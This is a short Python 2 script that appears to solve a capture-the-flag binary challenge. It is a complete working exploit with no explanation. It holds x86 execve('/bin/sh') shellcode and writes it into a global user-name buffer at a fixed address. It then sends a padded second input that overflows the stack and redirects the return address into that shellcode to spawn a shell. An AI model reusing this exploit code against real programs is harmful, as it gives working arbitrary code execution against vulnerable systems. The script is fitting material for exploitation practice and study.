import struct

shell = '\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80'

#0x0804a040  a_user_name

user = 'dat_wil'
in1 = user + shell + '\n'
in2 = 'a'*(0x60-0x1c+12) + struct.pack("<I", (0x804a040+len(user)))
print in1 + in2
